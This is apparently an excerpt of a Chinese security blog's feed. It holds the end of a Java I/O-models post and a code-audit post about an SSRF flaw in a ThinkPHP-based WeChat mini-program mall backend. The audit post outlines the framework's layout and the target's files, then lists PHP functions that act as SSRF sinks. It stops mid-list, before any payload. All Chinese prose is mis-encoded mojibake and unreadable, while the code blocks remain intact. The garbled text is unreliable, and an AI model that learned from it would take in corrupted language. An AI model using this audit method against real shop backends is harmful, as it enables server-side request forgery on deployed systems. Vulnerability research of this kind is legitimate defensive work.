I&#x2F;O äº‹ä»¶ã€‚å½“æŸä¸ª I&#x2F;O äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œè¿™äº›ç³»ç»Ÿè°ƒç”¨ä¼šè¿”å›ï¼Œé€šçŸ¥åº”ç”¨ç¨‹åºæ‰§è¡Œç›¸åº”çš„ I&#x2F;O æ“ä½œã€‚I&#x2F;O å¤šè·¯å¤ç”¨æ¨¡å‹é€‚ç”¨äºé«˜å¹¶å‘ã€ä½å»¶è¿Ÿå’Œé«˜ååé‡çš„åœºæ™¯ï¼Œå› ä¸ºå®ƒèƒ½å¤Ÿæœ‰æ•ˆåœ°å‡å°‘çº¿ç¨‹æ•°é‡å’Œä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€ã€‚</p><p>ä¿¡å·é©±åŠ¨æ¨¡å‹ä¾èµ–äºä¿¡å·ï¼ˆå¦‚ SIGIOï¼‰æ¥é€šçŸ¥åº”ç”¨ç¨‹åº I&#x2F;O äº‹ä»¶çš„å‘ç”Ÿã€‚åœ¨è¿™ä¸ªæ¨¡å‹ä¸­ï¼Œåº”ç”¨ç¨‹åºé¦–å…ˆè®¾ç½®æ–‡ä»¶æè¿°ç¬¦ä¸ºä¿¡å·é©±åŠ¨æ¨¡å¼ï¼Œå¹¶ä¸ºç›¸åº”çš„ä¿¡å·æ³¨å†Œå¤„ç†å‡½æ•°ã€‚å½“ I&#x2F;O äº‹ä»¶å‘ç”Ÿæ—¶ï¼Œå†…æ ¸ä¼šå‘é€ä¸€ä¸ªä¿¡å·ç»™åº”ç”¨ç¨‹åºï¼Œè§¦å‘ä¿¡å·å¤„ç†å‡½æ•°çš„æ‰§è¡Œã€‚ç„¶åï¼Œåº”ç”¨ç¨‹åºå¯ä»¥åœ¨ä¿¡å·å¤„ç†å‡½æ•°ä¸­æ‰§è¡Œç›¸åº”çš„ I&#x2F;O æ“ä½œã€‚I&#x2F;O ä¿¡å·é©±åŠ¨æ¨¡å‹é€‚ç”¨äºä½å¹¶å‘ã€ä½å»¶è¿Ÿå’Œä½ååé‡çš„åœºæ™¯ï¼Œå› ä¸ºå®ƒéœ€è¦ä¸ºæ¯ä¸ª I&#x2F;O äº‹ä»¶åˆ›å»ºä¸€ä¸ªä¿¡å·å’Œä¿¡å·å¤„ç†å‡½æ•°ã€‚</p><p>Linux çš„å†…æ ¸å°†æ‰€æœ‰å¤–éƒ¨è®¾å¤‡éƒ½çœ‹åšä¸€ä¸ªæ–‡ä»¶æ¥æ“ä½œï¼Œå¯¹ä¸€ä¸ªæ–‡ä»¶çš„è¯»å†™æ“ä½œä¼šè°ƒç”¨å†…æ ¸æä¾›çš„ç³»ç»Ÿå‘½ä»¤(api)ï¼Œè¿”å›ä¸€ä¸ª file descriptorï¼ˆfdï¼Œæ–‡ä»¶æè¿°ç¬¦ï¼‰ã€‚è€Œå¯¹ä¸€ä¸ªSocketçš„è¯»å†™ä¹Ÿä¼šæœ‰å“åº”çš„æè¿°ç¬¦ï¼Œç§°ä¸º socket fdï¼ˆSocketæ–‡ä»¶æè¿°ç¬¦ï¼‰ï¼Œæè¿°ç¬¦å°±æ˜¯ä¸€ä¸ªæ•°å­—ï¼ŒæŒ‡å‘å†…æ ¸ä¸­çš„ä¸€ä¸ªç»“æ„ä½“ï¼ˆæ–‡ä»¶è·¯å¾„ï¼Œæ•°æ®åŒºç­‰ä¸€äº›å±æ€§ï¼‰ã€‚</p><p>åœ¨Linuxä¸‹å¯¹æ–‡ä»¶çš„æ“ä½œæ˜¯åˆ©ç”¨æ–‡ä»¶æè¿°ç¬¦(file descriptor)æ¥å®ç°çš„ã€‚</p><h3 id="å¼‚æ­¥-IO"><a href="#å¼‚æ­¥-IO" class="headerlink" title="å¼‚æ­¥ IO"></a>å¼‚æ­¥ IO</h3><p>å¼‚æ­¥ I&#x2F;Oï¼ˆAsynchronous I&#x2F;Oï¼‰æ¨¡å‹ä¸åŒæ­¥ I&#x2F;O æ¨¡å‹çš„ä¸»è¦åŒºåˆ«åœ¨äºï¼Œå¼‚æ­¥ I&#x2F;O æ“ä½œä¼šåœ¨åå°è¿è¡Œï¼Œå½“æ“ä½œå®Œæˆæ—¶ï¼Œæ“ä½œç³»ç»Ÿä¼šé€šçŸ¥åº”ç”¨ç¨‹åºã€‚åº”ç”¨ç¨‹åºä¸éœ€è¦ç­‰å¾… I&#x2F;O æ“ä½œçš„å®Œæˆï¼Œå¯ä»¥ç»§ç»­æ‰§è¡Œå…¶ä»–ä»»åŠ¡ã€‚è¿™ç§æ¨¡å‹é€‚ç”¨äºå¤„ç†å¤§é‡å¹¶å‘è¿æ¥ï¼Œä¸”å¯ä»¥ç®€åŒ–åº”ç”¨ç¨‹åºçš„è®¾è®¡å’Œå¼€å‘ã€‚</p><ul><li>åŒæ­¥ï¼šåœ¨æ‰§è¡Œ I&#x2F;O æ“ä½œæ—¶ï¼Œåº”ç”¨ç¨‹åºéœ€è¦ç­‰å¾…æ“ä½œçš„å®Œæˆã€‚åŒæ­¥æ“ä½œä¼šå¯¼è‡´çº¿ç¨‹é˜»å¡ï¼Œç›´åˆ°æ“ä½œå®Œæˆã€‚åŒæ­¥ I&#x2F;O åŒ…æ‹¬é˜»å¡ I&#x2F;Oã€éé˜»å¡ I&#x2F;O å’Œ I&#x2F;O å¤šè·¯å¤ç”¨ã€‚</li><li>å¼‚æ­¥ï¼šåœ¨æ‰§è¡Œ I&#x2F;O æ“ä½œæ—¶ï¼Œåº”ç”¨ç¨‹åºä¸éœ€è¦ç­‰å¾…æ“ä½œçš„å®Œæˆã€‚å¼‚æ­¥æ“ä½œå…è®¸åº”ç”¨ç¨‹åºåœ¨ I&#x2F;O æ“ä½œè¿›è¡Œæ—¶ç»§ç»­æ‰§è¡Œå…¶ä»–ä»»åŠ¡ã€‚å¼‚æ­¥ I&#x2F;O æ¨¡å‹åŒ…æ‹¬ä¿¡å·é©±åŠ¨ I&#x2F;O å’Œå¼‚æ­¥ I&#x2F;Oã€‚<br><img src="/2024/11/04/code/javanio/image-13.png"></li></ul>]]></content>
      
      
      <categories>
          
          <category> Code </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€ä»£ç å®¡è®¡ã€‘æŸå¾®ä¿¡å°ç¨‹åºå•†åŸåå°å­˜åœ¨SSRFæ¼æ´</title>
      <link href="/2024/11/01/WebSecurity/codeaudit/randomfileread/"/>
      <url>/2024/11/01/WebSecurity/codeaudit/randomfileread/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.dkewl.com/code/detail3016.html">https://www.dkewl.com/code/detail3016.html</a></p><h2 id="ç›´æ¥çœ‹åç«¯æºç "><a href="#ç›´æ¥çœ‹åç«¯æºç " class="headerlink" title="ç›´æ¥çœ‹åç«¯æºç "></a>ç›´æ¥çœ‹åç«¯æºç </h2><p>å¾ˆæ¸…æ¥šçš„æœ‰ä¸ªthinkphp<br>ThinkPHP æ˜¯ä¸€ä¸ªå›½å†…æµè¡Œçš„ PHP æ¡†æ¶ï¼Œä¸»è¦ç”¨äºå¿«é€Ÿå¼€å‘ä¸­å°å‹åº”ç”¨ï¼Œå°¤å…¶æ˜¯ä¸ºå›½å†… PHP å¼€å‘è€…è®¾è®¡ã€‚å®ƒä»¥é«˜æ•ˆã€ç®€å•ã€çµæ´»å’Œè½»é‡çº§ä¸ºç‰¹ç‚¹ï¼Œæ”¯æŒ MVC æ¨¡å¼ï¼ˆModel-View-Controllerï¼‰ï¼Œå¹¶ä¸”æ˜“äºæ‰©å±•å’Œä¿®æ”¹ã€‚ä»¥ä¸‹æ˜¯å¯¹ ThinkPHP æ¡†æ¶ç»“æ„å’Œæ ¸å¿ƒå†…å®¹çš„è¯¦ç»†ä»‹ç»ï¼š</p><h3 id="1-ç›®å½•ç»“æ„"><a href="#1-ç›®å½•ç»“æ„" class="headerlink" title="1. ç›®å½•ç»“æ„"></a>1. ç›®å½•ç»“æ„</h3><p>åœ¨ ThinkPHP æ¡†æ¶ä¸­ï¼Œç›®å½•ç»“æ„å¤§ä½“å¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">é¡¹ç›®æ ¹ç›®å½•</span><br><span class="line">â”œâ”€â”€ application/       # åº”ç”¨ç›®å½•ï¼Œä¸»è¦æ”¾ç½®é¡¹ç›®çš„ä¸šåŠ¡é€»è¾‘ä»£ç </span><br><span class="line">â”‚   â”œâ”€â”€ common/        # å…¬å…±æ¨¡å—ï¼Œå­˜æ”¾å…¬å…±å‡½æ•°ã€ç±»åº“ç­‰</span><br><span class="line">â”‚   â”œâ”€â”€ config/        # é…ç½®æ–‡ä»¶ç›®å½•</span><br><span class="line">â”‚   â”œâ”€â”€ controller/    # æ§åˆ¶å™¨ç›®å½•ï¼ŒMVC ä¸­çš„ Controller</span><br><span class="line">â”‚   â”œâ”€â”€ model/         # æ¨¡å‹ç›®å½•ï¼ŒMVC ä¸­çš„ Model</span><br><span class="line">â”‚   â”œâ”€â”€ view/          # è§†å›¾ç›®å½•ï¼ŒMVC ä¸­çš„ View</span><br><span class="line">â”‚   â”œâ”€â”€ route/         # è·¯ç”±æ–‡ä»¶ç›®å½•</span><br><span class="line">â”‚   â””â”€â”€ ...</span><br><span class="line">â”œâ”€â”€ extend/            # æ‰©å±•ç›®å½•ï¼Œå­˜æ”¾ç¬¬ä¸‰æ–¹åº“æˆ–è‡ªå®šä¹‰æ‰©å±•</span><br><span class="line">â”œâ”€â”€ public/            # Web æ ¹ç›®å½•ï¼Œå­˜æ”¾å…¥å£æ–‡ä»¶å’Œé™æ€èµ„æº</span><br><span class="line">â”œâ”€â”€ runtime/           # è¿è¡Œæ—¶ç›®å½•ï¼Œå­˜æ”¾ç¼“å­˜ã€æ—¥å¿—ç­‰æ–‡ä»¶</span><br><span class="line">â””â”€â”€ thinkphp/          # æ ¸å¿ƒæ¡†æ¶æ–‡ä»¶ç›®å½•</span><br></pre></td></tr></table></figure><p>æ¯ä¸ªç›®å½•çš„ä¸»è¦ä½œç”¨å¦‚ä¸‹ï¼š</p><ul><li><strong>application</strong>ï¼šé¡¹ç›®çš„ä¸»åº”ç”¨ç›®å½•ï¼ŒåŒ…å«æ‰€æœ‰ä¸šåŠ¡é€»è¾‘ã€‚</li><li><strong>common</strong>ï¼šé¡¹ç›®çš„å…¬å…±æ¨¡å—ï¼Œé€‚ç”¨äºå¤šä¸ªæ¨¡å—ä¹‹é—´å…±äº«çš„å†…å®¹ã€‚</li><li><strong>config</strong>ï¼šå­˜æ”¾é¡¹ç›®çš„å…¨å±€é…ç½®æ–‡ä»¶ã€‚</li><li><strong>controller</strong>ï¼šæ§åˆ¶å™¨ç›®å½•ï¼Œè´Ÿè´£æ¥æ”¶è¯·æ±‚å¹¶è°ƒç”¨æ¨¡å‹å¤„ç†æ•°æ®ã€‚</li><li><strong>model</strong>ï¼šæ¨¡å‹ç›®å½•ï¼Œè´Ÿè´£æ•°æ®å¤„ç†å’Œä¸šåŠ¡é€»è¾‘ã€‚</li><li><strong>view</strong>ï¼šè§†å›¾ç›®å½•ï¼Œè´Ÿè´£å±•ç¤ºæ•°æ®ã€‚</li><li><strong>route</strong>ï¼šå­˜æ”¾è·¯ç”±æ–‡ä»¶ï¼Œå®šä¹‰ URL è·¯ç”±è§„åˆ™ã€‚</li><li><strong>extend</strong>ï¼šå¯æ‰©å±•çš„ç›®å½•ï¼Œå¯ä»¥æ”¾å…¥ç¬¬ä¸‰æ–¹åº“æˆ–è‡ªå®šä¹‰ç±»åº“ã€‚</li><li><strong>public</strong>ï¼šWeb è®¿é—®ç›®å½•ï¼Œå…¥å£æ–‡ä»¶ï¼ˆå¦‚ <code>index.php</code>ï¼‰æ”¾ç½®åœ¨æ­¤ã€‚</li><li><strong>runtime</strong>ï¼šè¿è¡Œæ—¶ç›®å½•ï¼Œå­˜æ”¾ç¼“å­˜å’Œæ—¥å¿—æ–‡ä»¶ã€‚</li><li><strong>thinkphp</strong>ï¼šThinkPHP æ¡†æ¶çš„æ ¸å¿ƒæ–‡ä»¶ã€‚</li></ul><h3 id="2-ThinkPHP-æ ¸å¿ƒç»“æ„"><a href="#2-ThinkPHP-æ ¸å¿ƒç»“æ„" class="headerlink" title="2. ThinkPHP æ ¸å¿ƒç»“æ„"></a>2. ThinkPHP æ ¸å¿ƒç»“æ„</h3><p>ThinkPHP æ¡†æ¶ä¸»è¦ç”±ä»¥ä¸‹å‡ ä¸ªæ ¸å¿ƒæ¨¡å—ç»„æˆï¼š</p><h4 id="1-æ§åˆ¶å™¨ï¼ˆControllerï¼‰"><a href="#1-æ§åˆ¶å™¨ï¼ˆControllerï¼‰" class="headerlink" title="1) æ§åˆ¶å™¨ï¼ˆControllerï¼‰"></a>1) æ§åˆ¶å™¨ï¼ˆControllerï¼‰</h4><p>æ§åˆ¶å™¨æ˜¯ MVC æ¨¡å¼ä¸­çš„ â€œCâ€ï¼Œæ˜¯ç”¨æˆ·è¯·æ±‚çš„ç›´æ¥æ¥æ”¶è€…ã€‚ThinkPHP ä¸­çš„æ§åˆ¶å™¨é€šå¸¸ç»§æ‰¿è‡ª <code>Think\Controller</code>ï¼Œå¹¶é€šè¿‡ URL è°ƒç”¨ã€‚ä¸€ä¸ªç®€å•çš„æ§åˆ¶å™¨æ–‡ä»¶ç»“æ„å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hello, ThinkPHP!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-æ¨¡å‹ï¼ˆModelï¼‰"><a href="#2-æ¨¡å‹ï¼ˆModelï¼‰" class="headerlink" title="2) æ¨¡å‹ï¼ˆModelï¼‰"></a>2) æ¨¡å‹ï¼ˆModelï¼‰</h4><p>æ¨¡å‹æ˜¯ MVC æ¨¡å¼ä¸­çš„ â€œMâ€ï¼Œç”¨äºå¤„ç†æ•°æ®é€»è¾‘ã€æ•°æ®åº“æ“ä½œç­‰ã€‚ThinkPHP ä½¿ç”¨ ORMï¼ˆå¯¹è±¡å…³ç³»æ˜ å°„ï¼‰æ–¹å¼å¤„ç†æ•°æ®åº“æ•°æ®ã€‚é€šå¸¸æ¨¡å‹ç±»ç»§æ‰¿è‡ª <code>think\Model</code>ï¼Œå¹¶ä½¿ç”¨ç®€å•çš„è¯­æ³•å®Œæˆæ•°æ®åº“æ“ä½œï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">namespace</span> <span class="title class_">app</span>\<span class="title class_">index</span>\<span class="title class_">model</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Model</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">extends</span> <span class="title">Model</span> </span>&#123;</span><br><span class="line">    <span class="comment">// å¯ä»¥å®šä¹‰æ•°æ®è¡¨çš„é¢å¤–æ“ä½œæˆ–ä¸šåŠ¡é€»è¾‘</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨æ–¹æ³•åŒ…æ‹¬ <code>find()</code>ã€<code>select()</code>ã€<code>insert()</code>ã€<code>update()</code> ç­‰ã€‚</p><h4 id="3-è§†å›¾ï¼ˆViewï¼‰"><a href="#3-è§†å›¾ï¼ˆViewï¼‰" class="headerlink" title="3) è§†å›¾ï¼ˆViewï¼‰"></a>3) è§†å›¾ï¼ˆViewï¼‰</h4><p>è§†å›¾æ˜¯ MVC æ¨¡å¼ä¸­çš„ â€œVâ€ï¼Œè´Ÿè´£æ˜¾ç¤ºæ•°æ®ç»™ç”¨æˆ·ã€‚ThinkPHP æ”¯æŒå¤šç§æ¨¡æ¿å¼•æ“ï¼Œå¦‚åŸç”Ÿçš„ PHPã€Smartyã€Twig ç­‰ï¼Œé»˜è®¤ä½¿ç”¨ ThinkPHP è‡ªå¸¦çš„æ¨¡æ¿å¼•æ“ã€‚è§†å›¾æ–‡ä»¶ä¸€èˆ¬æ˜¯ <code>.html</code> æ–‡ä»¶ï¼Œä½äº <code>view</code> ç›®å½•ä¸­ï¼Œé€šè¿‡æ§åˆ¶å™¨è¿›è¡Œè°ƒç”¨æ¸²æŸ“ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fetch</span>(<span class="string">&#x27;index&#x27;</span>); <span class="comment">// æ¸²æŸ“ index.html</span></span><br></pre></td></tr></table></figure><h4 id="4-é…ç½®ï¼ˆConfigï¼‰"><a href="#4-é…ç½®ï¼ˆConfigï¼‰" class="headerlink" title="4) é…ç½®ï¼ˆConfigï¼‰"></a>4) é…ç½®ï¼ˆConfigï¼‰</h4><p>ThinkPHP ä½¿ç”¨é…ç½®æ–‡ä»¶è¿›è¡Œç¯å¢ƒçš„æ§åˆ¶ã€‚é…ç½®æ–‡ä»¶ä¸»è¦ä½äº <code>application/config.php</code>ï¼Œå¯ä»¥é…ç½®æ•°æ®åº“ã€ç¼“å­˜ã€è·¯ç”±ç­‰ä¿¡æ¯ã€‚é…ç½®æ”¯æŒæ•°ç»„æ ¼å¼ï¼Œä¸”å¯ä»¥æŒ‰éœ€è¦†ç›–ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> [</span><br><span class="line">    <span class="comment">// æ•°æ®åº“é…ç½®</span></span><br><span class="line">    <span class="string">&#x27;database&#x27;</span> =&gt; [</span><br><span class="line">        <span class="string">&#x27;type&#x27;</span>     =&gt; <span class="string">&#x27;mysql&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;hostname&#x27;</span> =&gt; <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;database&#x27;</span> =&gt; <span class="string">&#x27;test_db&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span> =&gt; <span class="string">&#x27;root&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;hostport&#x27;</span> =&gt; <span class="string">&#x27;3306&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">    <span class="comment">// è·¯ç”±é…ç½®</span></span><br><span class="line">    <span class="string">&#x27;route&#x27;</span>    =&gt; [</span><br><span class="line">        <span class="string">&#x27;pathinfo_depr&#x27;</span> =&gt; <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">    ],</span><br><span class="line">];</span><br></pre></td></tr></table></figure><h4 id="5-è·¯ç”±ï¼ˆRouteï¼‰"><a href="#5-è·¯ç”±ï¼ˆRouteï¼‰" class="headerlink" title="5) è·¯ç”±ï¼ˆRouteï¼‰"></a>5) è·¯ç”±ï¼ˆRouteï¼‰</h4><p>è·¯ç”±ç”¨äºå®šä¹‰ URL è®¿é—®æ¨¡å¼ã€‚ThinkPHP æ”¯æŒ RESTful é£æ ¼çš„è·¯ç”±ï¼Œå¹¶æä¾›çµæ´»çš„ URL å®šä¹‰æ–¹å¼ã€‚è·¯ç”±é…ç½®æ–‡ä»¶ä¸€èˆ¬ä½äº <code>route</code> ç›®å½•ä¸­ï¼Œå®šä¹‰ URL åˆ°æ§åˆ¶å™¨æ–¹æ³•çš„æ˜ å°„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">facade</span>\<span class="title">Route</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®šä¹‰ç®€å•è·¯ç”±</span></span><br><span class="line"><span class="title class_">Route</span>::<span class="title function_ invoke__">rule</span>(<span class="string">&#x27;hello/:name&#x27;</span>, <span class="string">&#x27;index/index/hello&#x27;</span>);</span><br></pre></td></tr></table></figure><h3 id="é’ˆå¯¹è¿™ä¸ªæºä»£ç åˆ†æ"><a href="#é’ˆå¯¹è¿™ä¸ªæºä»£ç åˆ†æ" class="headerlink" title="é’ˆå¯¹è¿™ä¸ªæºä»£ç åˆ†æ"></a>é’ˆå¯¹è¿™ä¸ªæºä»£ç åˆ†æ</h3><ol><li>**<code>404.html</code>**ï¼šé€šå¸¸æ˜¯è‡ªå®šä¹‰çš„ 404 é”™è¯¯é¡µé¢ã€‚</li><li>**<code>æ•°æ®åº“.sql</code>**ï¼šæ•°æ®åº“æ–‡ä»¶ï¼ŒåŒ…å«åˆå§‹åŒ–æˆ–ç»“æ„æ•°æ®ã€‚</li><li>**<code>composer.json</code> å’Œ <code>composer.lock</code>**ï¼šComposer ä¾èµ–ç®¡ç†æ–‡ä»¶ï¼Œè¯´æ˜è¯¥æ¡†æ¶ä½¿ç”¨ Composer æ¥ç®¡ç† PHP åŒ…ã€‚</li><li>**<code>index.php</code>**ï¼šé€šå¸¸æ˜¯å…¥å£æ–‡ä»¶ï¼Œç”¨äºæ¥æ”¶è¯·æ±‚å¹¶å¯åŠ¨æ¡†æ¶ã€‚</li><li>**<code>log.json</code>**ï¼šå¯èƒ½æ˜¯æ—¥å¿—æ–‡ä»¶ï¼Œè®°å½•æ¡†æ¶æ“ä½œä¿¡æ¯ã€‚</li><li>**<code>README.txt</code>**ï¼šè¯´æ˜æ–‡ä»¶ï¼Œå¯èƒ½åŒ…å«å…³äºæ¡†æ¶çš„åŸºæœ¬ä¿¡æ¯å’Œä½¿ç”¨è¯´æ˜ã€‚</li><li>**<code>sql.txt</code>**ï¼šå¦ä¸€ä»½ SQL æ–‡ä»¶ï¼Œå¯èƒ½åŒ…å«ä¸åŒçš„æ•°æ®åº“è¡¨ç»“æ„æˆ–æ•°æ®ã€‚</li><li>**<code>version.php</code>**ï¼šç‰ˆæœ¬æ§åˆ¶æ–‡ä»¶ï¼Œæ ‡è®°å½“å‰æ¡†æ¶ç‰ˆæœ¬ã€‚</li><li>**<code>.htaccess</code>**ï¼šApache é…ç½®æ–‡ä»¶ï¼Œç”¨äº URL é‡å†™æˆ–å…¶ä»–é…ç½®ã€‚</li></ol><p>ä»ç›®å½•ç»“æ„æ¥çœ‹ï¼Œè¿™ä¸ªåŸºäº ThinkPHP äºŒæ¬¡å¼€å‘çš„æ¡†æ¶åŒ…å«ä»¥ä¸‹é‡è¦ç›®å½•ï¼š</p><ol><li>**<code>addons</code>**ï¼šé€šå¸¸æ˜¯æ’ä»¶æˆ–æ‰©å±•æ¨¡å—çš„ç›®å½•ï¼Œç”¨äºå¢å¼ºæ¡†æ¶çš„åŠŸèƒ½ã€‚</li><li>**<code>application</code>**ï¼šä¸»è¦åº”ç”¨ç¨‹åºç›®å½•ï¼ŒåŒ…å«æ ¸å¿ƒä¸šåŠ¡é€»è¾‘ä»£ç ï¼ˆå¦‚æ§åˆ¶å™¨ã€æ¨¡å‹ã€è§†å›¾ï¼‰ã€‚</li><li>**<code>attachs</code>**ï¼šä¸€èˆ¬ç”¨äºå­˜å‚¨é™„ä»¶æˆ–ä¸Šä¼ çš„æ–‡ä»¶ã€‚</li><li>**<code>data</code>**ï¼šç”¨äºå­˜å‚¨æ•°æ®æ–‡ä»¶ï¼Œå¦‚ç¼“å­˜ã€æ—¥å¿—ç­‰ã€‚</li><li>**<code>lang</code>**ï¼šè¯­è¨€åŒ…ç›®å½•ï¼Œæ”¯æŒå¤šè¯­è¨€åŠŸèƒ½ã€‚</li><li>**<code>runtime</code>**ï¼šè¿è¡Œæ—¶ç›®å½•ï¼Œå­˜å‚¨ç¼“å­˜å’Œä¸´æ—¶æ–‡ä»¶ã€‚</li><li>**<code>static</code>**ï¼šé™æ€èµ„æºç›®å½•ï¼ŒåŒ…å« CSSã€JavaScript å’Œå›¾ç‰‡ç­‰å‰ç«¯èµ„æºã€‚</li><li>**<code>thinkphp</code>**ï¼šæ¡†æ¶æ ¸å¿ƒæ–‡ä»¶ï¼ŒåŒ…å« ThinkPHP çš„åŸå§‹æ–‡ä»¶å’Œåº“ã€‚</li><li>**<code>vendor</code>**ï¼šç¬¬ä¸‰æ–¹ä¾èµ–ç›®å½•ï¼Œç”± Composer ç®¡ç†çš„ PHP åŒ…é€šå¸¸å­˜æ”¾åœ¨è¿™é‡Œã€‚</li></ol><p><code>application</code> ç›®å½•åŒ…å«äº†ä¸€äº›ä¸»è¦é…ç½®æ–‡ä»¶å’Œæ ¸å¿ƒä¸šåŠ¡æ¨¡å—ï¼š</p><ol><li><p><strong>é…ç½®æ–‡ä»¶</strong>ï¼š</p><ul><li><strong><code>command.php</code><strong>ã€</strong><code>common.php</code><strong>ã€</strong><code>config.php</code><strong>ã€</strong><code>crons.php</code><strong>ã€</strong><code>database.php</code><strong>ã€</strong><code>route.php</code><strong>ã€</strong><code>tags.php</code></strong> ç­‰æ–‡ä»¶ï¼Œç”¨äºé…ç½®æ¡†æ¶çš„æ ¸å¿ƒåŠŸèƒ½ï¼ŒåŒ…æ‹¬æ•°æ®åº“ã€è·¯ç”±ã€è®¡åˆ’ä»»åŠ¡ç­‰ã€‚</li></ul></li><li><p><strong>ä¸šåŠ¡æ¨¡å—</strong>ï¼š</p><ul><li>**<code>admin/behavior</code>**ï¼šå¯èƒ½å®šä¹‰äº†è¡Œä¸ºæ‰©å±•æˆ–ä¸­é—´ä»¶ï¼Œä¾‹å¦‚ <strong><code>Cron.php</code></strong> æ–‡ä»¶ï¼Œå¯èƒ½ç”¨äºå®šæ—¶ä»»åŠ¡çš„è¡Œä¸ºæ§åˆ¶ã€‚</li><li>**<code>admin/controller</code>**ï¼šåŒ…å«æ§åˆ¶å™¨æ–‡ä»¶ï¼Œä¾‹å¦‚ <strong><code>Ad.php</code></strong> å’Œ **<code>Admin.php</code>**ï¼Œè´Ÿè´£åå°ç®¡ç†åŠŸèƒ½çš„ä¸šåŠ¡é€»è¾‘ã€‚</li></ul></li></ol><h2 id="SSRF-æ¼æ´ç‚¹"><a href="#SSRF-æ¼æ´ç‚¹" class="headerlink" title="SSRF æ¼æ´ç‚¹"></a>SSRF æ¼æ´ç‚¹</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1. CURLç›¸å…³</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>()</span><br><span class="line"><span class="title function_ invoke__">curl_exec</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. æ–‡ä»¶æ“ä½œç›¸å…³</span></span><br><span class="line"><span class="title function_ invoke__">file_get_contents</span>()</span><br><span class="line"><span class="title function_ invoke__">fopen</span>()</span><br><span class="line"><span class="title function_ invoke__">readfile</span>()</span><br><span class="line"><span class="title function_ invoke__">file</span>()</span><br><span class="line"><span class="title function_ invoke__">fread</span>()</span><br><span class="line"><span class="title function_ invoke__">fgets</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. å›¾ç‰‡å¤„ç†ç›¸å…³</span></span><br><span class="line"><span class="title function_ invoke__">imagecreatefromurl</span>()</span><br><span class="line"><span class="title function_ invoke__">getimagesize</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. å…¶ä»–ç½‘ç»œæ“ä½œ</span></span><br><span class="line"><span class="title function_ invoke__">fsockopen</span>()</span><br><span class="line"><span class="title function_ invoke__">socket_connect</span>()</span><br><span class="line"><span class="title 